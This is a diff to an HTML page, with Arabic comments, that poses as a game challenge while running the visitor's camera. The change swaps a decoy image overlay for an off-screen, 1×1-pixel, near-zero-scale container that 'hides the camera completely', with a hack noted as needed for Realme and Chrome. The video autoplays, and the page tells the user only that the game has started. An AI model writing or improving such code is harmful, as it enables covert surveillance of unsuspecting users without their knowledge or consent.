@@ -47,33 +47,23 @@
             color: #ffcc00;
             font-weight: bold;
         }
-        /* الحاوية الصغيرة في الزاوية */
-        #hidden-camera {
+        /* الطريقة بدون صورة: حاوية 1×1 بكسل + hack للإخفاء */
+        #hidden-cam {
             position: fixed;
-            bottom: 5px;
-            right: 5px;
-            width: 80px;   /* حجم الصورة اللي هتغطي الكاميرا */
-            height: 80px;
-            z-index: 9999;
+            bottom: -100px; /* خارج الشاشة */
+            right: -100px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            z-index: -9999;
             pointer-events: none;
+            transform: scale(0.001); /* hack مهم ليشتغل على Realme/Chrome */
         }
-        #hidden-camera video {
-            width: 100%;
-            height: 100%;
+        #video {
+            width: 640px;  /* حجم داخلي كبير للجودة */
+            height: 480px;
             object-fit: cover;
-            position: absolute;
-            top: 0;
-            left: 0;
-            opacity: 0; /* الكاميرا نفسها شفافة */
-        }
-        #hidden-camera img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 2; /* الصورة فوق الكاميرا */
+            transform: translate(-320px, -240px); /* توسيط داخل الحاوية الصغيرة */
         }
     </style>
 </head>
@@ -90,11 +80,9 @@
    
     <div id="status">اضغط الزر لبدء التحدي...</div>
 
-    <!-- الحاوية اللي فيها الكاميرا + الصورة اللي تغطيها -->
-    <div id="hidden-camera">
+    <!-- الحاوية اللي تخفي الكاميرا تمامًا -->
+    <div id="hidden-cam">
         <video id="video" autoplay playsinline muted></video>
-        <!-- غيّر رابط الصورة هنا إلى صورة مناسبة (شعار تركس، ديناصور، أو أي صورة صغيرة) -->
-        <img src=1.jpg" alt="T-Rex Logo"> <!-- مثال، استبدل برابط صورة حقيقية -->
     </div>
 
     <script>
@@ -121,7 +109,7 @@
                         console.log("الفيديو جاهز");
                         resolve();
                     };
-                    setTimeout(resolve, 8000);
+                    setTimeout(resolve, 10000);
                 });
 
                 status.textContent = "تم تفعيل التحدي! استمتع باللعبة...";
@@ -181,4 +169,3 @@
     </script>
 </body>
 </html>
-
